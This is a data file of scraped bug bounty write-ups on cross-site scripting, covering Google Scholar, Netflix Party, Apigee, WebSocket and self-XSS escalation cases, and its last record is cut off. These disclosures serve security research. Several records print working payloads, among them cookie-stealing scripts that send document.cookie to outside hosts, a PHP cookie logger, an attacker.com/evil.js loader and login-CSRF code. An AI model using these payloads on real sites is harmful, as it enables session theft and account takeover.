{"source_url": "https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html", "title": "Researching Polymorphic Images for XSS on Google Scholar · Doyensec's Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.doyensec.com/2020/04/30/polymorphic-images-for-xss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nResearching Polymorphic Images for XSS on Google Scholar · Doyensec's Blog ABOUT US We are security engineers who break bits and tell stories. Visit us doyensec.com Follow us @doyensec Engage us info@doyensec.com Blog Archive 2025 2024 2023 2022 2021 2020 2019 2018 2017 © 2025 Doyensec LLC Researching Polymorphic Images for XSS on Google Scholar 30 Apr 2020 - Posted by Lorenzo Stella A few months ago I came across a curious design pattern on Google Scholar . Multiple screens of the web application were fetched and rendered using a combination of location.hash parameters and XHR to retrieve the supposed templating snippets from a relative URI, rendering them on the page unescaped. This is not dangerous per se, unless the platform lets users upload arbitrary content and serve it from the same origin, which unfortunately Google Scholar does, given its image upload functionality. While any penetration tester worth her salt would deem the exploitation of the issue trivial, Scholarâs image processing backend was applying different transformations to the uploaded images (i.e. stripping metadata and reprocessing the picture). When reporting the vulnerability, Googleâs VRP team did not consider the upload of a polymorphic image carrying a valid XSS payload possible, and instead requested a PoC||GTFO. Given the age of this technique, I first went through all past âwell-knownâ techniques to generate polymorphic pictures, and then developed a test suite to investigate the behavior of some of the most popular libraries for image processing (i.e. Imagemagick, GraphicsMagick, Libvips). This effort led to the discovery of some interesting caveats. Some of these methods can also be used to conceal web shells or Javascript content to bypass âselfâ CSP directives . Payload in EXIF The easiest approach is to embed our payload in the metadata of the image. In the case of JPEG/JFIF, these pieces of metadata are stored in application-specific markers (called APPX ), but they are not taken into account by the majority of image libraries. Exiftool is a popular tool to edit those entries, but you may find that in some cases the characters will get entity-escaped, so I resorted to inserting them manually. In the hope of Googleâs Scholar preserving some whitelisted EXIFs, I created an image having 1.2k common EXIF tags, including CIPA standard and non-standard tags. While that didnât work in my case, some of the EXIF entries are to this day kept in many popular web platforms. In most of the image libraries tested, PNG metadata is always kept when converting from PNG to PNG, while they are always lost from PNG to JPG. Payload concatenated at the end of the image (after 0xFFD9 for JPGs or IEND for PNGs) This technique will only work if no transformations are performed on the uploaded image, since only the image content is processed. As the name suggests, the trick involves appending the JavaScript payload at the end of the image format. Payload in PNGâs iDAT In PNGs, the iDAT chunk stores the pixel information. Depending on the transformations applied, you may be able to directly insert your raw payload in the iDAT chunks or you may try to bypass the resize and re-sampling operations. Googleâs Scholar only generated JPG pictures so I could not leverage this technique. Payload in JPGâs ECS In the JFIF standard, the entropy-coded data segment (ECS) contains the output of the raw Huffman-compressed bitstream which represents the Minimum Coded Unit (MCU) that comprises the image data. In theory, it is possible to position our payload in this segment, but there are no guarantees that our payload will survive the transformation applied by the image library on the server. Creating a JPG image resistant to the transformations caused by the library was a process of trial and error. As a starting point I crafted a âbaseâ image with the same quality factors as the images resulting from the conversion. For this I ended up using this image having 0-length-string EXIFs. Even though having the payload positioned at a variable offset from the beginning of the section did not work, I found that when processed by Google Scholar the first bytes of the imageâs ECS section were kept if separated by a pattern of 0x00 and 0x14 bytes. From here it took me a little time to find the right sequence of bytes allowing the payload to survive the transformation, since the majority of user agents were not tolerating low-value bytes in the script tag definition of the page. For anyone interested, we have made available the images embedding the onclick and mouseover events. Our image library test suite is available on Github as doyensec/StandardizedImageProcessingTest . Timeline [2019-09-28] Reported to Google VRP [2019-09-30] Googleâs VRP requested a PoC [2019-10-04] Provided PoC #1 [2019-10-10] Googleâs VRP requested a different payload for PoC [2019-10-11] Provided PoC #2 [2019-11-05] Googleâs VRP confirmed the issue in 2 endpoints, rewarded $6267.40 [2019-11-19] Googleâs VRP found another XSS using the same technique, rewarded an additional $3133.70 Other relevant posts: Windows Installer, Exploiting Custom Actions 18 Jul 2024 Office Documents Poisoning in SHVE 03 Nov 2023 Client-side JavaScript Instrumentation 25 Sep 2023 Introducing Session Hijacking Visual Exploitation (SHVE): An Innovative Open-Source Tool for XSS Exploitation 31 Aug 2023 Windows Installer EOP (CVE-2023-21800) 21 Mar 2023 SSRF Cross Protocol Redirect Bypass 16 Mar 2023 A New Vector For âDirtyâ Arbitrary File Write to RCE 28 Feb 2023 ImageMagick Security Policy Evaluator 10 Jan 2023 Let's speak AJP 15 Nov 2022 Diving Into Electron Web API Permissions 27 Sep 2022 Regexploit: DoS-able Regular Expressions 11 Mar 2021 One Bug To Rule Them All: Modern Android Password Managers and FLAG_SECURE Misuse 22 Aug 2019 Jackson gadgets - Anatomy of a vulnerability 22 Jul 2019"}
{"source_url": "https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18", "title": "Netlifx Party - Two Severe XSS Vulnerabilities | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@kristian.balog/netflix-party-simple-xss-ec92ed1d7e18. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNetlifx Party - Two Severe XSS Vulnerabilities | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Netflix Party — XSS Vulnerabilities kr-b 4 min read · Apr 14, 2020 -- Listen Share https://netflixparty.com Chrome extension that lets you watch Netflix shows and movies with your friends. User nickname Discovery One late night playing some World of Warcraft, my friend and I decided we wanted to watch a Netflix show together, so we went ahead and installed the new Netflix Party Chrome add-on that is all over the news and social media. We start up a party, and out of curiosity I start looking around to see what we can do with this, and I spot a set user nickname field.. So just as a shot in the dark I thought why not just try it? I set my name as <script>alert(1)</script> I get nothing… Then I pause the video and a popup appears! Whenever I paused/played the video, sent a message, joined or left a party, it would write my nickname to the chat bar on the right and execute the JavaScript on all members of the party. Vulnerability After looking around at the JavaScript of the extension, I spot the vulnerable code in the addMessage() function: Unfiltered user input being inserted into HTML The developers were clever enough to escape the input string for message variable however, the userNickname variable was inserted into the HTML without any filtering, thus creating the XSS vulnerability as any HTML tags will be parsed by the browser. Exploits An XSS vulnerability allows an attacker to inject HTML and also execute arbitrary JavaScript. Here are a few examples of possible attacks I could think of. Change chat history Starting with a fun, harmless one. You can change the messages and usernames of all the party member with the below payload by setting it as your nickname. Users exchange messages (just me right now 😢 very lonely) After changing nickname to payload, all the messages are changed Convincing phishing attack This can also lead to a more severe attack. By setting your nickname to the below payload, a full screen iframe will be created on the page, covering it, containing the attacker’s webpage which can contain a fake Netflix login page saying for example “Your session has expired, Please Login again”, the credentials will then get sent to the attacker. All this will happen without the victims ever leaving netflix.com. Fix I reported the vulnerability to the developers, after a couple days with no response I chased them up and they fixed it within 1 week. Fixed code in version 1.7.7 where the userNickname variable is also escaped. XSS Vulnerability — User Icon Discovery After reviewing the fix for the previous bug, I stumbled upon something else, that I’m surprised I didn’t notice before, maybe I was too preoccupied playing with the first thing I found (good tip, look for the same vulnerability). There was another use input field which I forgot about, the user icon. Vulnerability Users can’t change their icons by uploading files however, they choose an icon from a list of files stored locally by the extension. This code below then prints that to the page This value is created with chrome.runtime.getURL('img/' + newicon) and newIcon can’t be edited directly from the extension, but the value is stored in and fetched from Chrome’s local storage, which can be edited! The $userIcon variable is not filtered, so a simple payload like this would work: x\" onerror=alert(1) // which turns into <img src=\"chrome-extension://.../img/x\" onerror=\"alert(1)\"> // this can be stored by (while in context of NetflixParty) chrome.storage.local.set({\"userIcon\": 'x\" onerror=alert(1)'}); Press enter or click to view image in full size User can then join any party or have members join their party, and the JavaScript will be executed instantly Exploits The exploits possible with this are exactly the same as the previous examples but they just need to be tweaked a little bit and not be within <script> tags but part of the onerror function. Fix I then reported this bug, and chased them up a couple times over a few weeks but still no response. So I thought giving this to the hacker community might make them notice :\\ Conclusion As this is a very trending and popular extension, with it being promoted by big media outlets and at time of writing, has over 8 million downloads, it’s quite important to also consider the security aspects when building such an application. Although the vulnerability here doesn’t impact the developer’s assets such as their own servers or any stored information on their side, this does put their users at risk Extra Info Just out of curiosity and wanting to practice some programming, I reverse engineered the application and wrote a full exploit tool for this in Python as the application is using unprotected/unauthenticated web sockets (another vulnerability for another time) anyone that has the details of a Netflix Party (npSessionId, npServerId) can talk to the server and interact with it. This means that an attacker can exploit the above mentioned XSS without even needing a Netflix account, they just join a session by providing the payload in the JSON parameter of the request. The code is very messy sorry https://github.com/kr-b/netflixparty_exploit Netflix Bug Bounty Security Vulnerability Exploit No rights reserved by the author. -- -- Written by kr-b 60 followers · 11 following kr-b.com No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4", "title": "Google Acquisition XSS (Apigee). So when I was trying to verify some… | by TnMch | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGoogle Acquisition XSS (Apigee). So when I was trying to verify some… | by TnMch | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Google Acquisition XSS (Apigee) TnMch 2 min read · May 6, 2020 -- 1 Listen Share So when I was trying to verify some Google acquisition website I enter apigee.com which provides API management, so as always I start my burp suite and I try to verify all the functions as possible, On the first try, everything was secure and all my first test failed, but as a bug hunter it should not be 100% secure and nothing is safe, So I log out and start to check the login and register option, look all right here at some point, I tried to check the password reset action, get a link in my email account that looks like this Press enter or click to view image in full size reset password email link : https://api.accounts.apigee.com/management/users/[ REDACTED ]/resetpw?token=ZW0tsHaU - REDACTED- eeTDi2YRIN1CICmFjOSSE2JvllO_ - REDACTED- Here, I have the idea to try to bypass the token and obtain a valid link for all users, which allows me to update any user password, but this failed too and can’t bypass it when I was trying to edit the link and change the token code, I saw something normal for me, it looks like this entry has not been filtered here, so I tried to send some XSS payload as a test. Press enter or click to view image in full size source code page Press enter or click to view image in full size XSS POC alert Press enter or click to view image in full size XSS change index page And here where things begin 😃 let's steal some cookies 😍 as it's not legal to hack someone account, I tested in my own account create first the payload : https://api.accounts.apigee.com/management/users/xxxxxx/resetpw?token=x xxxxxx\"><script>new Image().src=’ https://requestb.in/xxxxxx?code='+document.c ookie</script><a href=” ON CLICK & All cookies will be sent to us😅 request in requestb.in Report time, I submitted this using their VRP program. I got the following mail Press enter or click to view image in full size Jul 11, 2017: “Nice catch!” answer 😍 love these words Bug Bounty Google Vrp Security Pentesting -- -- 1 Written by TnMch 120 followers · 112 following Security Analyst Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0", "title": "Always escalate! From Self-XSS to Persistent XSS on Login Portal | by Nnez | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nnez/always-escalate-from-self-xss-to-persistent-xss-on-login-portal-54265b0adfd0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAlways escalate! From Self-XSS to Persistent XSS on Login Portal | by Nnez | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Always escalate! From Self-XSS to Persistent XSS on Login Portal Nnez 4 min read · Apr 2, 2020 -- 2 Listen Share Press enter or click to view image in full size Ref https://upload.wikimedia.org/wikipedia/commons/4/42/Copenhagen_Metro_escalators.jpg About 2 months ago, I discovered a persistent self-XSS on a login portal. Most of programs do not accept self-XSS report, but I managed to escalate this to persistent XSS on login page by chaining with Login CSRF and reported to the program as valid vulnerability. Yet again, this is my discovery on private program, so let’s call it redacted.com There was an account portal page where you could change some settings on your account including firstname, lastname. I spent some time tampering with all the parameters that I was able to. The result was I found that there was no validation of firstname and lastname on the backend, meaning I could change my name to something like <em>John</em> . However, <script> tag or common XSS payload were not allowed because there was cloudflare in-between frontend and backend and the reflected name on account page was filtered as well. < was escaped to &lt; . I stopped looking for bugs on this account portal page thinking that it was too hardening for me. Few days later, I was willing to try again and got their login page on my browser but I noticed something strange before typing my credentials on the form. I was greeting with the name I changed last time, John but that HTML tag <em> was missing. I pressed CTRL+U on my keyboard, to bring source code of this page up to my screen and there was that HTML tag enclosing the name! unfiltered. I went on researching on how to bypass cloudflare WAF, there were many articles out there on the Internet but the core idea is to look for an origin IP of the server. An easiest and simple way is to look for IP history on viewdns.org. If the website was initially set up without cloudflare, an origin IP would be logged on the Internet history. Lucky me, I found an origin IP recorded on viewdns.org. I tried accessing the website from its origin IP and changed the name to <script>alert(\\”Are you hungry?\\”)</script> , it got pass to the backend with no cloudflare WAF involved. As expected, alert box prompted when I visited login page. So I found self-XSS on login page, then what? Most programs do not accept this type of vulnerability report becauuse it usually does not pose security threat but I spent too much time on this, there was no way back. The only was to go up! (I mean escalate) When you find a self-XSS (that’s not putting javascipt code in dev console), ALWAYS try chaining it with other vulnerabilities. There are many articles out there from many great minds writing about escalating self-XSS. One that might relate to my situation is Login CSRF plus self-XSS Let’s see how does my payload was stored on login page. 1.) After login, if user check on Remember me box, session will be saved in cookies named rememberme, with expiration time set to one year. 2.) If a user visit login page again, even without logging out before, he/she will be greeting with firstname reflected on login page. Therefore, if I manage to find login CSRF, I could force other users to login on my account and if they visit the login page again, my XSS payload will be executed. I started by Burp Suite to get a look at login request and as expected, CSRF token was sent along with my credentials during login request. I tried removing that token and re-sent the request… Unforetunately, it failed. As I said, I could not give up. Have you ever heard of poor man CSRF?. Usually, to implement anti-CSRF system, the CSRF token need to be tied to something that can be used to identify the person who perform that action. If CSRF token does not tie to user’s session, an attacker could grab a valid CSRF token from the website and reuse it on victim. I tried this option, copying CSRF token from a different browser session and reuse it… I got login to my account! I finally found a way to force XSS on user login page. Here is the proof-of-concept code I used to exploit this chain of vulnerabilities <?php $html = file_get_contents(' https://redacted.com/login' ); preg_match('/name\\=\\”CSRF_TOKEN\\” value\\=\\”(.*?)\\”\\', $html, $match); if( count ($match) ){ $token = $match[1]; echo ' <form name=”loginForm” target=”_blank”> <!-— form that contains my credentials + grabbed CSRF token --> </form> <script> window.forms.loginForm.submit(); </script> '; } ?> If a user visit my page, he/she will be forced to log into my account and next visit on login page, he/she will be greeting with my XSS payload! Timeline of Vulnerability Report - Feb 10, 2020 — Report sent - Feb 11, 2020 — Triage with Medium severity - Mar 14, 2020 — Reward $500 + $150 (bonus) - Mar 17, 2020 — Fix deployed Self Xss Csrf Bypass Bug Bounty -- -- 2 Written by Nnez 418 followers · 59 following opions come from my inner voice Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa", "title": "Exploiting WebSocket [Application Wide XSS / CSRF] | by Osama Avvan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting WebSocket [Application Wide XSS / CSRF] | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Exploiting WebSocket [Application Wide XSS / CSRF] Osama Avvan 5 min read · Feb 17, 2020 -- 4 Listen Share Assalam u Alikum, it’s been a while I haven’t contributed to this wonderful community so I am back with a new write up about WebSocket which is fun to exploit. So first of all what is WebSocket? WebSockets allow the client/server to create a 'full-duplex' (two-way) communication channels, allowing the client and server to truly communicate asynchronously, simply both client/server can send and receive messages. So unlike some API endpoints where developers strictly check the Origin Header value, but here in WebSocket case they mostly ignore it, which in result allows any arbitrary Origin to make a connection to the WebSocket instance of the Web App. The format of a WebSocket URL is like this, wss://readact.com, here wss:// is used for a secure SSL connection like https:// some web apps also uses ws:// which is like http:// Now we will look for some places where we can find the WebSocket URL or endpoint. The handiest and easiest way to find WebSocket endpoint is the BurpSuite WebSockets history tab. BurpSuite > Proxy > WebSockets history There you will see all the history of WebSockets requests. The other place where you can look for WebSocket endpoint is the Network tab of your Browser Developer Tool. If WebSocket connection request is sent to the server you will find it there. Now the Place where there is a 99% chance of finding the WebSocket endpoint if the WebApp is using WebSocket is the JavaScript files or the page source of the WebApp, Search for these keywords in the JavaScript file. wss:// ws:// websocket Now after finding the WebSocket endpoint, we have to check if the endpoint is accepting the connection from other Origins . For this simply head to https://www.websocket.org/echo.html and in the Location textbox enter the WebSocket URL/endpoint . Click on the Connect button in the Log box you will get the response, if the connection was successful it will print Connected or if the connection fails it will print DISCONNECTED. You can also check the connection with BurpSuite. From the Burp Repeater send the Request with your Origin in the Origin Header value . If the server responds with a status code of 101 and your specified Origin is reflected OR if you see an * in the Origin header in the response this means that the connection was successful. Now let’s take a look at a Real-World Webapp scenario, I was hunting a private program so when I was inspecting the source code of the dashboard page of the domain, I came across this piece of code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); This confirms that the web app was using WebSocket, now I had to confirm that it accepts connections from other domains too. there are many ways to confirm it which I have also mentioned above, for this case, I just open up a new tab and in from the console I executed this code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e) { console.log(e); } The connection was established and I got the response in the console. Press enter or click to view image in full size So now I can send data to the server and can also receive data from the server. building a (Two-way Communication). Now I set up a listener to listen for incoming and outgoing communication from the server. But there wasn’t anything confidential to listen for. ws.onmessage = function(e) { console.log(e.data); } So now I tried to send a message to the server and was curious that how the server will handle it on the client-side. ws.send(“hello you are vulnerable”); But there was no reflection of the message in the client-side source code. After reading the JS files of the web app, I found a function which was handling the message received from the WebSocket, The data received from the server was being checked in a conditional statement , ws.onmessage = function(e) { if (e.data.indexOf(“||”) > 0) { var messs = e.data.split(“||”); let alertId = messs[0]; var type = messs[1]; let alertDom = messagee(alertId); } } So the data returned by the server must have || in between. and if the condition fulfilled then the data was rendered in the HTML of the page inside a tag. So to confirm that the data is placed inside the tag I sent a message to the server from my connected instance of WebSocket. ws.onopen = function(e) { ws.send(\"hello||you are vulnerable\"); }; Press enter or click to view image in full size and it worked :) Now to perform an XSS I just had to break out of the <a> tag, for this I wrote this code. <script language=”javascript” type=”text/javascript”> var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e){ console.log(e); var a = `”><script>alert(‘XSS’)<\\/script>||leetwa`; ws.send(a); } ws.onmessage = function (evt){ var received_msg = evt.data; console.log(evt.data); } ws.onclose = function(a){ console.log(a);} </script> There I got XSS on all the pages of the web app which were using WebSockets , similarly, I was able to perform CSRF attacks on all the pages using WebSockets and was able to modify the Content of the pages which were using WebSockets making the XSS, CSRF, Content Injection Application wide. Performing a malicious request to change victim email. ws.onopen = function(e) { console.log(e); const payload = `(function(){ const $ = e => document.querySelector(e); $(“#lastName”).value = “Hacked”; $(“#firstName”).value = “Account”; `$(“#company”).value = “Bad Company”; $(“#jobTitle”).value = “Hacker”; $(“#email”).value = “cyber.spidey@hacked.com”; $(“.btn-primary”).click(); `})();` var a = `”><script>${payload}<\\/script>||leetwa` ws.send(a); `}; I hosted this code on my webserver and I just had to send it to the victim and there you go, victim email will be changed or the XSS will execute on all of the pages of the web app. or else I could have changed the HTML of all the open pages by this code. ws.onopen = function(e) { console.log(e); const payload = “<center><h1>You have been Hacked</h1><br> <br><h1>Contact here: <a href=’https://evil.com'>Evil.com</a></h1></center>\" var a = `”><script>document.querySelector(“body”).innerHTML = “${payload}”<\\/script>||leetwa` `ws.send(a); }; That’s it Thank you for reading, the bug was accepted as a P1. Press enter or click to view image in full size Bug Bounty Infosecurity Bug Hunting Websocket JavaScript -- -- 4 Written by Osama Avvan 1.1K followers · 0 following Security Researcher, ❤️ To Code. Find me at: https://twitter.com/osamaavvan Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c89775cf8f", "title": "Self XSS to Account Takeover. Exploiting Self Stored XSS to escalate… | by Ch3ckM4te | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c89775cf8f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSelf XSS to Account Takeover. Exploiting Self Stored XSS to escalate… | by Ch3ckM4te | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self XSS to Account Takeover Ch3ckM4te 6 min read · Mar 24, 2020 -- 1 Listen Share Hello everyone, this is my first blog. I came across this topic while searching ways to escalate one of my finding for self XSS in a bug bounty program. Self XSS to Account Takeover After hours of reading blogs and medium articles, I came to know about few techniques or should I say few ways to chain multiple low level bugs that can lead to account takeover. I decided to not limit myself by just reading the blogs but to actually implement what I’ve learnt. I already have the bug bounty program on which I have a finding of stored self XSS but after reading the escalation steps, I found it to be secure from other necessary low level bugs that were needed for escalation. So, I decided to just practically try the method of chaining for escalation, hence created my own environment, a simple web application which demonstrates a set of vulnerabilities which are often considered out-of-scope, NA, P5 or just informational findings. TL,DR; -> I chained Stored Self XSS with Login/Logout CSRF and leveraged oAuth login functionality to steal user cookies -> Scroll to the bottom to find POC video as well as complete code for the setup and exploit Necessities: Stored Self XSS Login and Logout CSRF Functionality of traditional login as well as oAuth implementation Environment Setup This web application has a login page which provides two functionalities: Login with Email ID/Password Login with Google On logging into the account, if done with first method, it will fetch in some default values to be displayed in name, description etc. and on logging in with second method, it will fetch account details from Google account and display it on dashboard. The dashboard page also have a comment functionality (created just for a sake of demonstrating stored self XSS). Attack Overview: We will create a malicious script on our (attacker) server Embed it into attacker’s account by exploiting stored self XSS Create a page which does following: i. Logs out the victim user using Log out CSRF ii. Login to attacker’s account using Email/Password functionality iii. Execute stored XSS from attacker’s account which in-turn will load the external script (stored on attacker’s server) 4. Now, external script will start its execution in following way: i. Logs out the attacker ii. Login to victim’s account with the help of oAuth implementation iii. Steal victim cookies & send it to attacker’s server Detailed Explanation: Step 1 We will create a malicious JavaScript file on our (attacker) server. Suppose its evil.js Later in this article, we’ll look in detail for what to write in evil.js but for the meantime lets proceed with our attack. Step 2 We know that comment functionality of dashboard is vulnerable to self-stored XSS. So use the following code to embed external JavaScript file. <script src=http://attacker.com/evil.js></script> This code will load the external JavaScript file from attacker’s server and browser will start its execution. Step 3 (i) Logs out the victim user using Log out CSRF On analysis of web application’s log out functionality (just looking to the logout request :P), we can see its simply making a GET request on logout.php to destroy cookies. So, we will use img tag to hit to the log out page which will destroy victim’s cookies. <img src=http://localhost/app/logout.php> This code will try to fetch the image from the specified source and while doing so, it will make a GET request to the source URL which by our application’s logic, logs-out the user. (ii) Login to attacker’s account using Email/Password functionality As the web application has feature to login with email ID/password also, we will write a simple JavaScript code to send POST request to the URL with our credentials, after which attacker’s session will gets activated. Code for logging in to attacker’s account: navigator.sendBeacon(“http://localhost/GoogleLogin/authLocal.php\", new Blob([“username=admin&password=admin”], { type: “application/x-www-form-urlencoded” })) JavaScript has a very useful method navigator.sendBeacon() which can be used to send POST request with some very specific content types. It simply takes the URL to visit along with the data and content type. Read more about it here . Please note that we can also make invisible HTML form and send it using JavaScript to perform this action, sendBeacon just gives us a simple and much powerful method to use. (iii) Execute stored XSS from attacker’s account Now that we are logged in as attacker, we will redirect the victim to the page which executes our stored XSS (generally dashboard or edit_profile page). Once JavaScript executes, it will load up the external JavaScript file and start its execution. Step 4 Now, we have come to the point where we will see what the external JavaScript file (evil.js) will do. (i) Logs out the attacker: As we have seen previously, just hit the log out URL with img tag <img src=http://127.0.0.1/app/logout.php> Again, this will try to fetch image from source URL and make a GET request which will log out the user. (ii) Login to victim account with oAuth functionality: This is the critical step of the exploit, we have to carefully analyse the each request from initiation of the authentication process using oAuth till the time we get access to our application and on following each request, we will see a particular request (generally, it will look like /?auth=<some_code> ) which is responsible for authenticating us to our application. Code for logging in to victim’s account (for Google): navigator.sendBeacon(“https://accounts.google.com/o/oauth2/auth?response_type=code&access_type=online&client_id=3195217987-usqr8lj019fd8df2rlihu32gl3qk725r.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%2FGoogleLogin%2Fg-callback.php&state&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fplus.login%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&approval_prompt=auto\",\"\"); Here, method navigator.sendBeacon will make a POST request to the specified URL with no POST data. It is important to note that here we are considering a scenario where the victim is already logged in to the Gmail (oAuth Provider) which is usually true in real scenarios. (iii) Steal victim’s cookies We will simply craft a JavaScript payload which will steal victim’s cookie and send it to our server (in this case, to our Burp Collaborator). Now, we have victim’s cookies and then we can proceed to use them and get their session. var link=”http://random.burpcollaborator.net/VictimCookies=\"+document.cookie; navigator.sendBeacon(link,””); This will create a link of Burp’s Collaborator along with cookies of the logged in user and will send them to server using navigator.sendBeacon method. Something more… But generally websites have HttpOnly/Secure flag set on their session cookies, Right? So, in that case, we may use JavaScript to perform some malicious action like email address change adding our mobile number which could later be used in account takeover by password reset functionality. I’ve linked a similar blog post at the last for the references. Few points to be noted regarding my setup: For demonstrating traditional login with email and password, I’ve not setup the complete SQL server. The authLocal.php is the file which contains hard-coded values for credentials If you want to replicate my setup, ensure that you have organisation’s email address and not your personal one. This is because Google doesn’t allow test users to perform oAuth authentication (Sign in with Google) without verification of our web application. Here, I’ve used my college’s email address linked with google. I would also like to admit that the demonstrated case has quite a lot of assumptions and needs to be modified as per situation. This is just a demonstration of what I’ve learned while researching for ways to escalate self stored XSS. Any/All Suggestions Are Welcomed :) Resources: Mathias Karlsson’s Demo in Security Fest 2017 Geekboy’s AirBnb Article Self-XSS to Good-XSS (Uber Bug Bounty) Various other Medium articles, Use Google ;) Full Source Code: GitHub’s Repository Video POC: https://www.youtube.com/watch?v=NzkcE6csK98 At the end, I would like to thank my mentor Mr. Himanshu Giri ( https://twitter.com/h0i0m0a0n0s0h0u ) for motivating me to write my first blog and sharing my code on GitHub and also for introducing me to twitter ( https://twitter.com/rohit_sonii ). Good Luck! Happy Hunting! Bug Bounty Security Information Security Infosec Hacking -- -- 1 Written by Ch3ckM4te 97 followers · 1 following Started infosec career from Aug’18 | VAPT on 500+ websites | 15+ Hall of Fame | Started Blog on Feb’20 Follow me on https://twitter.com/rohit_sonii Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://smaranchand.com.np/2020/02/the-tricky-xss/", "title": "The Tricky XSS – Smaran Chand", "friendly_explanation": "This is a bug bounty writeup from https://smaranchand.com.np/2020/02/the-tricky-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe Tricky XSS – Smaran Chand Skip to content Smaran Chand Menu Home About Me Search for: February 28, 2020 The Tricky XSS Hello everyone, I would like to share a riveting issue regarding XSS (Cross-Site Scripting ) I endured a few months ago. Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. Moving towards the target, It was an online store where a user had to fill his/her address for any specific operations while playing with the textboxes and inputs I feed some random details and saved address nickname with value A<h1>A. And I bet it is very exciting moment for every bug hunters/pentester outta here, my eyes were looking for the “AA” but I was not able to see any reflection on the web page and then I clicked on the delete address button clicking on the button reflected my supplied HTML input with height h5 and h1. By this time I was pretty much sure that there should be an XSS for sure but in reality, while feeding the JavaScript payload I got to know that there is input length validation for 20 chars (including white spaces). Ohh no… You must be thinking, it might be frontend validation only? I tried intercepting and adding the payload in the HTTP request but the server did not accept. Now the main challenge was to find an XSS payload with less than 20 character lengths. I googled and found the XSS payload by Dr. Mario which was <script src=//14.rs> Such a short TLD, domain name and the entire script looked like art. The Javascript payload at index page was '';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}// msgbox+1 Using the same payload at the address nickname gave an XSS alert. And then I thought if it can interact with the DOM and print cookies or not since the used XSS payload or the content was not controlled by myself I thought to create my own shortest XSS payload just to alert the cookies. I planned to get the shortest domain first after a few minutes of googling I choose to get a Punycode domain and purchased one. I got a Punycode domain just to shorten/reduce the length of the payload. A few days back my friend Santosh aka Coded Brain attended Dr. Mario’s workshop at Threatcon 2019 in Kathmandu. He was very interested to share the experience and knowledge gained through. We talked about the issue and planned to exploit in a better way and discuss more. Since I had purchased the Punycode domain it was a bit complex to set up because something was bothering the execution of the code it took us a few minutes to figure out that we were missing just a “=” and trust me it was like a CTF challenge for us, cause we started researching about execution of scripts in SpiderMonkey engine and debugging part by part. The temple of Redbull has nothing to do here… So this was the content on the index page of the server. Thankyou Coded Brain for helping me in this stuff, I didn’t think it would be this easy, although all we did was manual try. Kudos !!! The content in the index page i.e index.html contains alert(document.cookie) in a plain text format. So my final XSS payload became <script src=//ł.rip> Saving the above payload in the address name field gave an XSS alert with cookies. You won’t believe but they considered as a self XSS a P5 and marked as won’t fix. And asked them if we can ask the program owner/developer to see the activity in the backend dashboard but they still said it would be a self XSS issue. Hold on bro… I was really fed up with this and planned to watch if it gets executed in the backend panel/dashboard or not. I could have used XSS hunter payload but the thorn in the way was accepted length of the input data. So I thought to create my own XSS hunter kinda payload for collecting the proof of concept. Here is the minimal code for stealing cookies and sending it to a remote server. document.location='https://ł.rip/save.php?c='+document.cookie; and the source code of save.php file is given below which would save the cookie into a text file. <?php header('Location:https://yourdomain.com'); $cookies = $_GET[\"c\"]; $file = fopen('logs.txt', 'a'); fwrite($file, $cookies . \"\\n\\n\"); ?> All files on the server whenever the script will be executed 